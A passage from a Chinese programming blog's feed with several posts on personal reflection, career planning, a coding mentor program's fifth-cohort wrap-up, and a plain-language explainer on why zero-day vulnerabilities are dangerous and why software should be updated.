裕的經濟並不是必備條件，但不可否認地，如果有的話，似乎就有辦法幫助到更多人，把影響力用在幫助他人身上。</p><p>不過我想了想，這最後應該還是取決於自己想要怎麼做。</p><p>有時候我覺得自己陷入一個無意義的拉扯之中，我希望得到外界的認同，卻又覺得只要自己認同自己就夠了，可是又沒有辦法百分之百肯定自己，堅守自己的立場。就像我上面提到的那樣，如果我對自己的理念有著充分的信仰，是不是在聽到別人傳教時，就不能有一丁點的動搖？</p><p>不過我想，以我的個性來說，搞不好這些問題永遠沒有答案，只能一直在這種猶豫的心態下繼續生活，或我猜自己搞不好還需要更多時間搞清楚自己到底想幹嘛，畢竟這種比較內心的東西，通常我寫著寫著，都不知道自己想要表達什麼了。以前如此，現在也是如此。</p><p>以我這種自認為務實的人來說，儘管前面講了一大堆我自己也不知道答案，甚至連自己也都還沒想清楚的東西，最後還是希望能幫自己找到一個解答。這個解答可以不必是恆真的，它不必是問題的最終解答，但它需要讓我能暫時放下那些我也不知道的問題，有個目標可以往前。</p><p>或許這個暫時的解答還是：「把自己的事情做好」吧，不管我的目標是大是小，或根本有沒有目標，還是有些事情是我想做的，或許現在我能做出的最好選擇，就是把那些我自己想達成的小事情做好。至於之後會怎麼樣，我也不知道。</p><p>喔對了，我覺得光是「把自己想做的事情做好」就是一件很難的事了。</p><p>有些事情你以為你想做，但其實搞不好內心深處不是這麼想，就像很多人都想減肥，但能付諸行動並堅持下去的可能只有一兩成或是更少，或許代表著他們內心深處覺得沒有減肥也沒有差，維持現狀也還 OK，因此沒有強大的動力推著他們前進。</p><p>這篇斷斷續續寫了兩三個月，但就跟以往同類型的文章一樣，屬於一種「我也不知道自己在寫三小」的狀況。總之，我就是想把此刻模糊的想法記下來，畢竟寫東西對我來說是種休閒娛樂，就像有些人藉著打電動放鬆一樣，這就是我的放鬆方式。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從「如果我離職…」的角度思考工作</title>
      <link href="/2022/01/23/think-as-if-i-quit-f384091ca2f6/"/>
      <url>/2022/01/23/think-as-if-i-quit-f384091ca2f6/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/think-as-if-i-quit-f384091ca2f6/0__7fXy3cJnNldm3R35.jpg"></p><p>在思考一些事情的時候，如果有個核心精神，通常都能讓自己更聚焦，也更明確知道自己要做的是什麼。</p><p>像是我以前就寫過一個核心精神是：「幫助以前的自己」，例如說 onboarding guide，如果我進公司的時候沒有這個東西，那我就會想寫一份，因為我要幫助以前的自己，幫助「進公司以後不知道如何開始」的那個我；雖然說我沒辦法重新再 on board 一次，但至少之後的新人可以參考我寫的指南。</p><p>除了這個之外，有些假想情境也能達到類似效果，幫助自己找到工作上的目標，今天想來提兩個我覺得滿有用的情境。</p><p>第一個是：「<strong>如果你今天離職了開始找下一份工作，你會希望履歷上有哪些成就？</strong>」</p><p>這個問題其實跟「你想從這份工作上獲得什麼？」有點類似，但我覺得又更為具體，而具體的好處就是比較容易能想像中畫面，就會更容易回答。</p><p>我認為這問題之所以好，是因為回答會直接影響到你目前怎麼看待你做的事情，以及你應該要完成哪些成果，達到什麼樣子的目標。</p><p>舉例來說，假設我現在的工作是負責一個 UI library 的開發，我希望我在找下一份工作的時候，履歷上的工作內容可以寫得越完整越好，就會越加分，像是這樣：「負責 UI library 開發，採用 monorepo 維護各個元件，導入 storybook 與設計師協作以及整合 Jest 進行測試」</p><p>我能很明確想像出下次求職時，我希望能在履歷上看到的東西，再從這個東西反推回我現在應該要做些什麼。以上面的範例來說的話，我現在應該把 UI library 的整體架構跟實作細節都理解得更透徹，才能幫助我下次面試的時候表現更好，證明我對 UI library 這個專案理解的夠深。</p><p>反之，如果我現在的工作內容在履歷上根本不值得一提，寫了也不會加分，那我就必須思考是不是現在的工作內容哪裡出了錯，或是整個方向都錯了，也可以跟主管討論是否有調整的空間。</p><p>所以說，如果你不確定自己現在的工作內容對未來是否有幫助，想像一下你下次面試時希望自己能拿出怎樣的履歷，上面寫著哪些曾經做過的事情，達成了哪些目標，接著就可以朝這個目標去努力。</p><p>其實這有點像是「五年後的你會在哪裡？做些什麼？」，但我覺得具體很多，沒有這麼難回答，而且對思考現有的工作內容會更有幫助一點。</p><p>第二個假想情境則是：「<strong>如果你明天要離職了，那你要怎麼確保留下的同事可以接手你的工作？</strong>」，或也可以換個角度想：「<strong>如果同事明天離職，你希望他留下哪些東西給你？</strong>」</p><p>假設我同事明天要離職了，我會希望他留下許多文件，包括：</p><ol><li>某某專案該怎麼建置環境，怎麼開發</li><li>某某專案的架構大概是怎樣</li><li>某某專案該怎麼部署</li><li>某某專案的開發流程為何</li><li>某某專案有沒有哪些需要特別留意的點</li></ol><p>如果能留下這些文件，會對我很有幫助，我就不用從頭開始研究，可以快速地交接專案。那既然我會希望同事離職時留下這些資料，我就應該以身作則，自己在離職時也要這樣做。</p><p>不過，其實這並不是離職後才能做的事情，而是現在就可以開始做，對吧？從現在就開始寫文件，紀錄專案的一些東西，等到離職時就只需要再確認一遍是否有更新到最新狀況，因為有了平日的累積，所以方便許多。</p><p>不過文件這件事情，第一個困難的點在於開始寫，第二個困難的點在於維護，有些文件雖然存在，但沒有更新到最新狀態，這樣文件跟實作不同步的狀況其實也滿頭痛的。</p><p>所以文件最好都寫一些比較大架構的東西，例如說系統架構可能就不會時常動，或是需要特別注意的地方，例如說某某系統的邏輯很複雜，處理的時候要小心之類的，至於更細節的實作，就交給程式碼去展現吧。</p><p>這篇簡單記錄一下近期在工作上的一些心得，文中提到的兩個情境都是以「離職」做為出發點，促使自己去思考在「現職」應該做些什麼，我自己覺得還滿有用的，因為情境都很具體，所以也比較好想像。</p><p>如果你也有什麼類似的情境可以幫助自己把現在的工作做得更好，歡迎在底下留言討論。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程式導師實驗計畫第五期結業心得</title>
      <link href="/2021/12/19/mtr05-b3d0ccaaea08/"/>
      <url>/2021/12/19/mtr05-b3d0ccaaea08/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/mtr05-b3d0ccaaea08/1__ebPPh8QsjSXPu7eeJwLDng.png"></p><p>為期半年又兩個月的程式導師實驗計畫第五期，在前陣子正式告一段落啦！這次一樣也依循著歷屆的傳統來 po 個心得與成果，我們先從成果開始好了。</p><p>第五期有陪著課程走到最後的人數是 54 人，但走到結束只代表沒有被淘汰制淘汰，不代表有把課程全部跟完，底下是課程最後的進度分佈：</p><p>21<del>24 週：30 人<br>17</del>20 週：15 人<br>17 週以下：9 人</p><p>最後在時限內求職成功的有 14 位同學，分母以 54 來算的話會是 26% 左右，而這次比較不同的是薪水變高了，找到工作的同學中八成以上月薪都有 45k，比上一期再高了一些。</p><p>接著來回顧一下第五期跟以往不同的幾個點。</p><h3 id="第五期做出的改動"><a href="#第五期做出的改動" class="headerlink" title="第五期做出的改動"></a>第五期做出的改動</h3><h4 id="加強課程學習系統"><a href="#加強課程學習系統" class="headerlink" title="加強課程學習系統"></a>加強課程學習系統</h4><p>以前的課綱是放在 GitHub 上面，以 GitHub 為主，第五期的話把課綱的內容移到了學習系統上，希望大部分操作都可以在系統內完成：</p><p><img src="/img/mtr05-b3d0ccaaea08/1__jDSSieZ2CoTr82gGPEbx__A.png"></p><p>不過有個缺點就是如果課綱要改動，那就是系統內跟 GitHub 兩個地方都要改，有一點小麻煩。畢竟對外還是以 GitHub 為主，兩邊要同步。</p><p>再來就是原本是用 Spectrum 作為面試討論區，第五期後段也把這個功能移到了學習系統內部，在內部有一個面試專區，讓大家可以分享面試心得以及討論。</p><h4 id="盡量把討論集中至討論區"><a href="#盡量把討論集中至討論區" class="headerlink" title="盡量把討論集中至討論區"></a>盡量把討論集中至討論區</h4><p>剛好第五期碰上了 GitHub Discussion 的新功能，就直接轉到這個很好用的平台上面：</p><p><img src="/img/mtr05-b3d0ccaaea08/1__vxso28JBQ1B6WjaHr0K7RA.png"></p><p>又可以結合 GitHub 又有現成論壇，作為課程的討論區我覺得很棒，不過碰到的問題就是功能跟 Mattermost（一個類似 Slack 的聊天軟體）有點重複，有些人還是會選擇在那邊提問而不是在這裡，或還是有些人習慣私訊提問，讓這邊的使用率沒有到很高。</p><h4 id="助教制度的完善，而我退居二線"><a href="#助教制度的完善，而我退居二線" class="headerlink" title="助教制度的完善，而我退居二線"></a>助教制度的完善，而我退居二線</h4><p>第五期的助教跟課程相關活動都交給兩位第四期的助教 Minw &amp; Clay 負責，負責由他們帶助教開會以及討論，第五期的活動也是由他們兩個籌劃，而我在課程中的角色逐漸退居於二線，有點像是固定每週出來講講話以及特殊活動才會出現的課程吉祥物。</p><p>由於這次第五期期中的時候疫情依然嚴峻，所以這一期完全沒有官方的線下聚會，唯一一次期中聚會用了當時正潮的 Gather，地圖也是很 carry 的學生畫出來的，整個都弄得很用心：</p><p><img src="/img/mtr05-b3d0ccaaea08/1__cvmwKy9hvIIJlbonyQFXXw.png"></p><h4 id="期末專案的常態化"><a href="#期末專案的常態化" class="headerlink" title="期末專案的常態化"></a>期末專案的常態化</h4><p>比起歷屆，這次做期末專案的人明顯變多了，而做出來的成果也變得更完整了，跟以往一樣，專案主題都是交給學生自行決定，我則是偶爾給一些建議或是跟他們說哪些功能可以放到後面再做，底下是這次的一些期末專案，有興趣的話可以看看：</p><ol><li><a href="https://github.com/jackielin7789978/DAYEAYEAYEA-frontend">DAYEAYEAYEA 生活選物</a></li><li><a href="https://github.com/s103071049/FAC-CAT-DESSERT">肥貓甜點</a></li><li><a href="https://github.com/flow-open-money-come/wander-map-frontend">Wandermap</a></li><li><a href="https://github.com/chachachater/foodmap">吃貨地圖</a></li><li><a href="https://github.com/angelina524/final-project-Z-axis-frontend/tree/dev">Z-axis</a></li><li><a href="https://github.com/Lindsay0214/Da-Nai-Wei-Wei-front-end">大奶微微</a></li></ol><h3 id="第五期心得以及關於第六期"><a href="#第五期心得以及關於第六期" class="headerlink" title="第五期心得以及關於第六期"></a>第五期心得以及關於第六期</h3><p>這一期對我來說感受最深的，莫過於前面提到的「退居二線」，這點我在第四期的<a href="/2021/02/22/mentor-program-4th-review-f8e8de92eea2/">檢討心得</a>裡面就提到過一次了：</p><blockquote><p><em>我想當的是第一線的老師，是在教學現場教課的那種。而第四期確實讓我有種，我好像漸漸遠離那個現場的感覺。不過助教改作業是必然會發生的，因為學生人數變多了，我一個人沒辦法負荷這麼多作業。而且我改作業其實也不一定會比助教好，因為助教程度其實更貼近學生一點，許多地方會比我做得更好。</em></p></blockquote><blockquote><p><em>想要把自己移回教學現場，可以想想看除了改作業以外有沒有什麼其他方法，例如說不定期直播帶 workshop 之類的，或者是多錄一些教學影片？</em></p></blockquote><p>這一期的作業更依賴於助教了，絕大多數時間都是助教在改作業，而我檢討裡面提的其他方法，這一期採用的是「定期直播」，基本上我每一週都會開直播開放提問，讓大家問各式各樣的問題，試圖用這種方式增加自己對課程的參與度。</p><p>但我自己覺得成效不是很好就是了。</p><p>眼尖的人會注意到第五期跟以往不同的一個點在於沒有期中心得，為什麼沒有期中心得呢，最大的原因就在於，我沒有太多心得可以寫。這讓我意識到了積極參與的重要性，很多事情並不是從旁觀看就會有心得感想，你必須實際參與，必須真的下場比賽，才知道那是怎麼一回事。</p><p>退居二線之後我才意識到親身互動的重要性，以前那些教學的心得跟反思都是從與學生交流以及問答的過程中一點一滴累積出來的，現在這些交流分散到了學生與助教之間，就變成了我自己沒有什麼心得，我也不知道課程的哪些地方需要改善。</p><p>未來如果開了第六期，我會認真考慮把助教制度拔掉看看，作業我來改，問題也是我來回。但我這樣做並不是因為「我覺得這樣會對學生比較好」，只是因為我覺得這樣會對課程的改善跟檢討比較有幫助。</p><p>在<a href="/2021/10/01/teaching-reflection-a1cbf3ae1997/">對於教學的反思</a>一文中，我是這麼說的：</p><blockquote><p><em>上述是前陣子累積的一些有關於教學的心得。趁著自己還記得時趕緊寫下來，否則過一陣子又會忘記了。</em></p></blockquote><blockquote><p><em>這篇教學的心得跟以往滿不一樣的，以前比較多的是針對教學內容的心得，這次比較多是心態面的東西，這一次的教學中我自己的心態確實跟以往有點不太一樣，但確切原因我也還不知道。</em></p></blockquote><p>當初沒有寫得太明，但心態面我指的其實是，這一陣子我對教學產生了一種倦怠感，是一種提不太起勁的感覺，跟以前都不一樣了。就像我<a href="/2021/02/12/happy-new-year-moo-e0e0ac5130e2/">年初</a>時說的一樣：</p><blockquote><p><em>我沒有覺得大家都一定要繼續前進，停在原地也是自己的選擇，而這選擇沒有對錯。但對我自己來說，我就是沒辦法接受自己原地踏步。所以如同開頭所說的，在這種心不足力也不足的狀態之下，才會感受到不安與愧疚吧，覺得自己應該做點事，可是卻又提不起勁來。</em></p></blockquote><p>如果要用個專有名詞來形容，我想這或許就是 burnout 吧？</p><p>在<a href="/2020/10/03/lidemy-mentor-program-4th-updates-c344302c8a2d/">第四期的心得</a>裡，我是這樣說的：</p><blockquote><p><em>這是一條永無止盡的路，我還在路上走著，而且一直都覺得沿途風景挺有趣的，暫時還沒打算要停下來。</em></p></blockquote><p>但我現在打算要暫時停下來了。</p><p>第六期如果照第五期模式開的話，課綱跟作業也都可以沿用以前的，可以完全複製第五期的東西繼續做下去，要繼續開的話絕對沒有問題，但我自己沒有辦法接受。</p><p>我沒有辦法接受自己在教學倦怠的狀況之下，繼續開設這種應該要付出更多心力的課程，也沒辦法接受新的一期在沒有更好的改動及調整的狀況下繼續做下去，就算有學生可以接受，我自己也會過意不去。</p><p>我想了想，會有倦怠感的原因之一可能是對於教學，自己的想法不同了吧。以前剛開始做的時候，因為是從零開始，只要能做出一點東西就覺得自己不錯了，有個 60 分就是及格。但是當重複的事情一直做的時候，就會想要不斷進步，不斷提高自己的標準，可能要 80 分才算及格，對於自己的要求變高了，但卻達不到對自己的要求。</p><p>所以，就如同之前在粉絲專頁就講過的，第六期短時間內是不會開了，先讓我休息個至少半年到一年左右，我需要一些時間好好思考一下自己下一步該怎麼走，以及在教學上想達成的目的跟想做的事情是什麼。</p><p>很感謝第五期的助教以及其他前幾期的學生們的付出，一起營造出一個友善的學習環境，以及線上小樹屋這個溫馨的環境。也很開心看到第五期的學生們找到了不錯的工作，正式踏入這個產業。</p><p>而還在學習的同學們也不用擔心，第五期的資源都會一直在那邊，有問題的話問我我也會回，作業也是會由我來改，只要繼續前進，就會離想去的目標愈來愈近。</p><p>第五期就這樣正式告一段落啦，我要去放假了，希望充電一陣子以後可以強勢回歸，帶來更好的課程。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>為什麼零時差攻擊（zero-day）這麼可怕？為什麼要常常更新軟體？</title>
      <link href="/2021/11/23/what-is-zero-day-2d343d5a70b3/"/>
      <url>/2021/11/23/what-is-zero-day-2d343d5a70b3/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/what-is-zero-day-2d343d5a70b3/0__uG55OPFEIxpprlCn.jpg"></p><p>你有被釣魚信件騙過嗎？許多人有。</p><p>舉一個例子好了，假設我知道你有在用 Facebook，於是我就寄了一封內容長得跟 Facebook 超級像的信件給你，信中寫說你的帳號已被盜用，要趕快點進連結修改密碼，這時候有些人就會真的點進去，輸入自己的舊密碼以及新密碼，而這些密碼就發送到了攻擊者的伺服器去。</p><p>如此一來，攻擊者僅僅靠著一封郵件，就拿到了受害者的密碼。許多釣魚信件都是大規模發送的，像是臉書上的台大交流社團，每隔一陣子就會有人 po 學校信箱收到釣魚信件的截圖。</p><p>而許多公司內部也會做釣魚信的演練，由內部或是外部的資安團隊寄送釣魚信件給公司同仁，看看他們會不會點開信中的連結，或甚至是點進連結以後進行操作，例如說重設密碼之類的。</p><p>我們公司也做過，雖然我知道那是釣魚信件，但抱持著好奇的心態外加自身對於攻擊的了解，我開著無痕視窗點進去了，因為我覺得這樣不會有事。</p><p>為什麼不會有事？因為第一我沒有輸入任何資訊，第二我開著無痕視窗，所以就算這是真的攻擊，我不處於任何登入狀態，什麼 XSS 或是 CSRF 都對我沒用，都拿不到我的個人資訊。</p><p>既然拿不到我的資訊，那我不就是安全的嗎？當時身為一個寫網頁的工程師，我覺得這樣十分合理。</p><p>但後來我才知道，我是錯的，而理由跟我在《<a href="https://medium.com/p/%E6%9C%8D%E5%8B%99%E5%B0%8D%E5%A4%96%E4%BD%86%E9%9C%80%E8%A6%81%E7%99%BB%E5%85%A5-%E8%83%BD%E6%9C%89%E4%BB%80%E9%BA%BC%E9%A2%A8%E9%9A%AA%E5%97%8E-a873d3418d99">服務對外但需要登入，能有什麼風險嗎？</a>》寫的類似：</p><blockquote><p>萬一有問題的是瀏覽器本身呢？</p></blockquote><p>假設瀏覽器有個漏洞，可以透過特定的 JavaScript 程式碼就讀取到電腦裡的檔案，而這個釣魚信件連到的網頁實作了這個攻擊方式，那我點進去以後就中招了。</p><p>只是點個連結而已，電腦就被入侵了，所以連結真的不要亂點。</p><p>你可能會想說：「拜託，Chrome 背後是 Google 這麼大間的公司，應該不會有什麼漏洞吧？他們不是很多厲害的工程師嗎？」</p><p>事實上，不管公司多大，工程師多厲害，依舊還是有許多的漏洞一再被發現，我們舉最近的 2021&#x2F;11&#x2F;15 的這篇 Chrome 官方部落格發佈的版本更新文章：<a href="https://chromereleases.googleblog.com/2021/11/stable-channel-update-for-desktop.html" title="Stable Channel Update for Desktop">Stable Channel Update for Desktop</a> 為例，就提到這次的版本修復了 25 個漏洞：</p><p><img src="/img/what-is-zero-day-2d343d5a70b3/1__wqHW9rF2TmsmHzJVrxLfdg.png"></p><p>你可能會想說：「那我每次都以最快的速度更新到最新版，不就沒問題了嗎？」，不，這樣其實還是有個顯而易見的問題。</p><p>上面列的那些漏洞，是 Chrome 最新版才修復的對吧？那修復需要時間對吧？所以從漏洞被發現一直到被修復，中間一定經過了一些時間，換句話說，有段時間就會處於「有漏洞，但沒有被修復」的狀態。</p><p>像是這種還沒被修復或甚至是還沒被其他人發現的漏洞，就叫做 zero-day 漏洞（零時差漏洞），你想擋都擋不住，因為你根本不知道它的存在。而拿這個 zero-day 去攻擊就叫做零時差攻擊，簡單來說就是用一個還沒被修復的漏洞來攻擊，所以你防不住。</p><p>這就是為什麼 zero day 這麼可怕，因為你無法直接去防禦它（大概只能透過一些機制去偵測入侵後的行為，或者是架個防火牆擋掉一些看起來惡意的流量，但依然沒辦法做到完全的防禦）。</p><p>而你用這個關鍵字去搜尋，也可以找到一堆新聞，例如說：</p><ol><li><a href="https://www.bloomberg.com/news/articles/2021-09-13/apple-fixes-security-bug-that-could-let-hackers-take-over-phones?srnd=premium-asia&sref=47WpoKbt">Apple Rushes Out Emergency Update to Stop ‘No Click’ Spyware</a></li><li><a href="https://www.thestandnews.com/international/ab%E5%9C%8B%E5%AE%B6%E7%B4%9A%E9%BB%91%E5%AE%A2%E6%94%BB%E6%93%8A%E9%A6%99%E6%B8%AF%E7%B6%B2%E7%AB%99-%E7%B6%B2%E6%B0%91%E7%80%8F%E8%A6%BD%E5%BE%8C%E9%9B%BB%E8%85%A6%E6%89%8B%E6%A9%9F%E8%B3%87%E6%96%99%E6%81%90%E8%A2%AB%E7%9B%9C">國家級黑客攻擊香港兩網站 曾用 Mac、iPhone 瀏覽者電腦手機資料恐被盜</a></li><li><a href="https://ec.ltn.com.tw/article/breakingnews/3454393">微軟稱中國駭客「零時差攻擊」侵電郵 籲用戶防備</a></li></ol><p>仔細想想會發現 zero day 真的可怕，例如說今年 4 月 GitLab 有一個超危險的漏洞 CVE-2021–22205，基本上只要能連到你的 GitLab，不需要登入就能夠在那台 server 上執行任意指令。</p><p>這個漏洞在 4&#x2F;7 被回報，4&#x2F;14 修復，如果今天知道這個漏洞的人沒有回報的話，那他可以打下所有開放在外網的 GitLab！既然能打下這個儲存程式碼的服務，那就可以看到所有專案的程式碼，繼續找出更多漏洞，或甚至是偷偷竄改程式，植入一些惡意程式碼等等，可以延伸出更多的攻擊。</p><p>因此像這樣的 zero day 除了透過正當管道回報以外，有些黑帽駭客也會拿去黑市販賣，或也有像 <a href="https://www.ithome.com.tw/news/100147">Zerodium</a> 這樣的公司，以高價收購漏洞之後再轉手把情資販賣給客戶。</p><p><img src="/img/what-is-zero-day-2d343d5a70b3/0__XHR4jkXqURTR0xpK.png"></p><p>不過先不論 zero day 這種還沒修補的漏洞，就算是在新版已經補起來的漏洞，依然會有許多人因為沒有升級到新版而被打下來。</p><p>舉我剛剛說的 4 月份的那個 GitLab 漏洞為例，在 11 月的時候整個網路上還有至少<a href="https://www.ithome.com.tw/news/147629">三萬台</a>的伺服器沒有修補這個漏洞。這就是為什麼應該時常更新一些服務，或至少有安全性漏洞產生的時候，一定要盡快修補。</p><p>如果服務有對外開放的話那就更危險了，因為有像是 <a href="https://www.shodan.io/">Shodan</a> 這種的搜尋引擎，可以很方便地搜尋想要的東西，例如說下圖就是搜尋在台灣的 GitLab 伺服器的結果：</p><p><img src="/img/what-is-zero-day-2d343d5a70b3/1__F__MWXLeDd1bsO__n4__lJHNg.png"></p><p>接著我只要把這個清單下載下來，然後準備好攻擊的腳本，寫一個小程式針對這些伺服器去做攻擊，很快就可以知道哪些伺服器用的是有漏洞的版本，靠著半年前就已經修好的漏洞，就可以入侵這些不知道是誰家的機器。</p><p>回到剛開頭的釣魚信小故事，原先我以為只是點個連結而已，不會有什麼事，但其實儘管只是點了連結，就能讓攻擊者有機會發動攻擊。儘管發動攻擊需要滿足一些前提（要能利用瀏覽器的漏洞），但依舊是有可能發生的。</p><p>所以連結不要亂點，真的好奇想點的話可以準備一個更安全的環境，軟體或是有對外的服務也要記得時常更新，尤其是安全性相關的漏洞要盡快更新，避免哪天輕易就被打下來。</p>]]></content>
      
      
      <categories>
          
          <category> 技術白話文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技術白話文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從自身經驗談談職涯上的選擇</title>
      <link href="/2021/11/14/i-dont-know-how-to-choose-job-6e38534786e4/"/>
      <url>/2021/11/14/i-dont-know-how-to-choose-job-6e38534786e4/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/i-dont-know-how-to-choose-job-6e38534786e4/0__MXxufhftQIW97nB4.jpg"></p><p>每到了程式導師實驗計畫進入尾聲的時候，就會有許多學生跟我討論 offer 選擇的問題，應該要去 A 公司還是 B 公司？對於這類型的問題，如果你預期我能給出一個確切的答案，沒錯，你是對的，確切的答案就是：「窩不知道」</p><p><img src="/img/i-dont-know-how-to-choose-job-6e38534786e4/1__L2fFKvBHRqJkg__YCyZLzgg.jpeg"></p><p>沒在跟你開玩笑，我是真的不知道。我覺得選擇是一件很「個人」的事情。</p><p>通常在給這類型的建議時，都會回想起自己以前是怎麼選擇的，換句話說，就是：「你會給 N 年前在選擇第一份工作的自己什麼建議？」</p><p>我自己其實相當滿意我的第一個選擇，有興趣的可以看回顧文：<a href="/2019/04/13/4-years-review-7fb7edc52687/?source=friends_link&sk=8a0099e4e8a8245f93ed140444669cd2">成為前端工程師的四週年回顧</a>，那時候我也不確定自己想做什麼，進了公司以後先學了 Node.js，寫一些簡單的後端小東西，也複習了 Android，修改了自家提供的 SDK 以及回覆廠商的問題，後來也學了 React，把前端的一些地方用 React 來重構。</p><p>前端、後端跟 Android 我都碰過了。對於這樣的工作內容，有些人就會覺得太雜了，樣樣通樣樣鬆，這樣到底有什麼用？但回頭來看，確實還滿有用的。正因為每個都懂一點，所以在討論相關知識的時候我都可以插上一腳，能比別人更快理解背後的脈絡以及系統的全貌，我覺得其實滿有幫助的。</p><p>有關於職涯的選擇，其實我過往的文章也都有談到一點，像是在 2016 年年底的：《<a href="https://blog.techbridge.cc/2016/12/31/review-2016/">一個資淺工程師年末的自我省視</a>》中，我談到了廣度跟深度以及小公司跟大公司的選擇：</p><blockquote><p><em>我自己第一間是待新創公司，待一年多之後其實想換到大公司去工作。為什麼？因為我想體驗大公司的開發流程。在很多新創公司，開發都沒有什麼流程，規則比較鬆散。例如說我自己一個人負責那整個專案的話，我要不要寫測試、程式碼風格要不要統一，這一切都取決於在我。有也可以，但沒有也可以，沒有人會管你，但是也沒有人會給你一些建議。優點是非常自由，缺點就是沒有人帶。</em></p></blockquote><blockquote><p><em>所以待久之後，就會想體驗一下大公司的開發流程到底長怎樣，想要試試看跟別人分工，而不再是自己一個人做一個專案。有人可以互相討論、互相指點，彼此教學相長。</em></p></blockquote><blockquote><p><em>不過無論是哪一種類型的公司，我覺得最重要的還是「找一份可以學到東西的工作」。這個道理很簡單，你一天必須花八個小時在這一份工作上面，如果你在這份工作已經找不到什麼可以學習了，那你的成長就停滯了。雖然當個薪水小偷領這些薪水也很不錯，但我覺得你也必須考慮到你之後的職涯發展（除非這份工作你本來就是要養老用的）。要找一份學得到的東西的工作，你才能邊工作邊成長，對你自己的生涯發展也會更順利一點。</em></p></blockquote><p>在 2017 年 4 月份的：《<a href="http://webcache.googleusercontent.com/search?q=cache:t3QShtcw1nwJ:huli.logdown.com/posts/1739564-big-company-or-startup+&cd=1&hl=zh-TW&ct=clnk&gl=tw">該進大公司還是新創？</a>》一文中，我給出的方向是：</p><blockquote><p><em>再者，其實「我應該進大公司還是新創」這個問題其實也問得不好。如果對方真的只問：「我該進大公司還是新創？」這種問題，那我也會覺得這個很空泛很爛。但就算對方這樣問，其實我們也還是可以再追問幾個問題，才會更明白提問者想要問的到底是什麼，例如說：</em></p></blockquote><blockquote><p><em>1. 你為什麼想（或不想）進大公司？</em></p></blockquote><blockquote><p><em>2. 你為什麼想（或不想）進新創公司？</em></p></blockquote><blockquote><p><em>3. 你目前猶豫的點是什麼？</em></p></blockquote><blockquote><p><em>以我的經歷來說，通常會問我這個問題的人，可能是已經拿到一間新創公司跟一間大公司的 offer 了，這時候才會提出：「我該進大公司還是新創」這個疑問。</em></p></blockquote><blockquote><p><em>而他們通常會提出這個疑問，其實背後的點有可能是：</em></p></blockquote><blockquote><p><em>1. 以職涯發展來說，大公司的經歷會不會比新創更吃香？至少大公司大家都聽過</em></p></blockquote><blockquote><p><em>2. 聽說新創做的事情比較雜，會不會到那邊之後什麼都要做，反而比較像打雜的？</em></p></blockquote><blockquote><p><em>3. 聽說在大公司只能當小螺絲，只負責其中一部分，會不會很無聊？</em></p></blockquote><blockquote><p><em>4. 聽說人很少的小公司因為培養新人的成本很高，來了就不想放他走，是真的嗎？</em></p></blockquote><blockquote><p><em>5. 在新創公司如果公司倒掉怎麼辦？</em></p></blockquote><blockquote><p><em>6. 新創公司的升遷跟獎金制度聽說都不完整，那選大公司是不是比較好？</em></p></blockquote><blockquote><p><em>因為原本的問題範圍太大，所以我們必須把這個大問題切成很多的小問題，其實這些小問題才是重點。而且你把這些小問題解決以後，大問題也就跟著解決了。</em></p></blockquote><p>接著在 2018 年年底的《<a href="https://blog.huli.tw/2018/12/29/after-two-years-am-i-senior/">兩年過後，我能夠被稱為資深工程師了嗎？</a>》，我重新回顧了兩年前的文章，並再次針對廣度與深度的問題給了一段回答，覺得先廣再深很不錯：</p><blockquote><p><em>兩年前我覺得自己廣度比深度多很多，因此我寫了一大堆文章針對不同的主題深入研究，讓自己對技術的理解變得更深。</em></p></blockquote><blockquote><p><em>那廣度呢？有了深度以後，我對廣度便不是這麼在乎了。我在第一份工作時還沒決定好自己想往哪裡走，因此我用 node.js 寫後端，用 react+redux 寫前端，還用 Java 寫了 Android 的 App。</em></p></blockquote><blockquote><p><em>可是在那之後我變成了專職的前端工程師，因此對後端技術便不是那麼關注，有哪些新的潮流我都不知道，更不用說 mobile 了。還是會維持一些基本的敏感度，例如說知道新出的 Flutter 之類的，但也僅僅知道這個關鍵字而已。</em></p></blockquote><blockquote><p><em>這其實也是我想走的方向，我覺得先廣再深其實是很不錯的一件事，你得先廣才能去找到自己想走的方向，並且也在這段時期累積一些對其他領域的基本理解，接著才走深，去深入理解你選的那個領域。</em></p></blockquote><blockquote><p><em>以我來說，我在廣度時期讓自己理解後端、Mobile 開發或是一點架構層面的東西，這些都對我之後的職涯很有幫助，至少我有基本的概念，不會什麼都不懂。</em></p></blockquote><p>而 2019 年 2 月的大雜燴文章《<a href="/2019/02/05/qa-be72946f0b23/">程式相關問題一網打盡：談自學、轉職、出國、職涯、教學、補習、騙錢、產業以及努力</a>》中，對於工作的選擇我給出了一個比較大方向的建議：</p><blockquote><p><em>選工作的時候應該優先考量什麼因素？</em></p></blockquote><blockquote><p><em>我自己會優先考量的是發展空間，在聽到工作內容時就差不多能知道在這間公司的發展性如何，我這邊指的發展性不是指說在公司內部是否能升官，而是指說個人能力的提升。</em></p></blockquote><blockquote><p><em>舉例來說，我現在這間公司找我的時候跟我說他們要把整個平台砍掉重練，所以我就知道如果進來的話，能夠跟著一個中型專案從無到有一路建立起來，我覺得這是很寶貴的經驗，所以對我來說會覺得很有發展空間。</em></p></blockquote><blockquote><p><em>這個邏輯可以套用到另一個問題：「什麼時候該離職？」，當你覺得發展空間有限，能學到的東西不多時就差不多可以離職了，到一個更有挑戰性的環境去。</em></p></blockquote><blockquote><p><em>除此之外，還有很多人會選團隊，覺得團隊對了整個就都對了，因為你有那個氛圍、有那個環境，就會是一個很適合發展的地方，大家互相砥礪一起進步。不過我從以前到現在都沒進過什麼大團隊，同事也都沒有真的到很厲害所以我還沒有機會體驗到就是了，或許等我進這種公司以後再來寫篇文章跟大家分享。</em></p></blockquote><p>一直到 2020 年 4 月我自己重新出去求職，從《<a 